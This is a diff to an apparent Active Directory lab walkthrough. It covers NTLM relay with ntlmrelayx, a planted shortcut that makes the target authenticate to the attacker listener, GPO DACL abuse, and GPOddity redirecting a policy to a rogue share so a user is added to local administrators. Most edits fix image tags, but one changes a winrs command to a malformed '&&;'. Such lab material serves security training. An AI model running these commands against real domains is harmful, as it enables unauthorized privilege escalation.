@@ -47,7 +47,7 @@ Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the foll
 ```batch
 sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
 ```
-<figure><img src="../assets/ntlm-relay-1.png"
+<figure><img src="../assets/gpo-abuse-2.png" alt=""><figcaption></figcaption></figure>
 
 On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. Go to **C:\AD\Tools -> Right Click -> New -> Shortcut**. Copy the following command in the Shortcut location:
 
@@ -56,7 +56,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRe
 ```
 
 It should look like this:
-<figure><img src="../assets/obj6(3).png"
+<figure><img src="../assets/obj6(3).png" alt=""><figcaption></figcaption></figure>
 
 Name the shortcut as studentx.lnk. Copy the lnk file to 'dcopr-ci\AI'.
 ```batch
@@ -65,7 +65,7 @@ C:\AD\Tools\studentx.lnk
 1 File(s) copied
 ```
 The simulation on dcorp-ci, will execute the lnk file within a minute. This is what the listener looks like on a successful connection:
-<figure><img src="../assets/obj6(4).png"
+<figure><img src="../assets/obj6(4).png" alt=""><figcaption></figcaption></figure>
 
 Connect to the ldap shell started on port 11000. Run the following command on a new Ubuntu WSL session:
 Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy **{0BF8D01C-1F62-4BDC-958C-57140B67D147}**:
@@ -73,7 +73,7 @@ Using this ldap shell, we will provide the studentx user, WriteDACL permissions 
 ```batch
 write_gpo_dacl studentx {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
-<figure><img src="../assets/ntlm-relay-2.png"
+<figure><img src="../assets/ntlm-relay-2.png" alt=""><figcaption></figcaption></figure>
 
 **NOTE:** Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the '**write_gpo_dacl**' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
@@ -100,7 +100,7 @@ Now, run the GPOddity command to create the new template.
 cd /mnt/c/AD/Tools/GPOddity
 sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'studentx' --password 'gG38Ngqym2DpitXuGrsJ' --command 'net localgroup administrators studentx /add' --rogue-smbserver-ip '172.16.100.x' --rogue-smbserver-share 'stdx-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
-<figure><img src="../assets/gpoddity.png"
+<figure><img src="../assets/gpoddity.png" alt=""><figcaption></figcaption></figure>
 
 Leave GPOddity running and from another Ubuntu WSL session, create and share the stdx-gp directory:
 
@@ -109,7 +109,7 @@ mkdir /mnt/c/AD/Tools/stdx-gp
 
 cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/stdx-gp
 ```
-<figure><img src="../assets/gpoddity-1.png"
+<figure><img src="../assets/gpoddity-1.png" alt=""><figcaption></figcaption></figure>
           
 From a command prompt (Run as Administrator) on the student VM, run the following commands to allow '**Everyone**' full permission on the **stdx-gp share**:
 ```batch
@@ -117,13 +117,13 @@ net share stdx-gp=C:\AD\Tools\stdx-gp /grant:Everyone,Full
 
 icacls "C:\AD\Tools\stdx-gp" /grant Everyone:F /T
 ```
-<figure><img src="../assets/gpoddity-2.png"
+<figure><img src="../assets/gpoddity-2.png" alt=""><figcaption></figcaption></figure>
           
 Verify if the **gPCfileSysPath** has been modified for the **DevOps Policy**. Run the following **PowerView command**:
 ```powershell
 Get-DomainGPO -Identity 'DevOps Policy'
 ```
-<figure><img src="../assets/gpoddity-3.png"
+<figure><img src="../assets/gpoddity-3.png" alt=""><figcaption></figcaption></figure>
 
 The update for this policy is configured to be every 2 minutes in the lab. After waiting for 2 minutes, studentx should be added to the local administrators group on dcorp-ci:
 
@@ -166,6 +166,6 @@ net share std-anything=C:\AD\Tools\ GPOddity\GPT_out
 icacls "C:\AD\Tools\GPOddity\GPT_out" /grant Everyone:F /T
 # Verify the persmission with
 Get-DomainGPO # Check gpcfilesyspath and whenchanged
-winrs -r:dcorp-ci cmd /c "set computername &#x26;&#x26; set username"
+winrs -r:dcorp-ci cmd /c "set computername &&; set username"
 </code></pre>
 
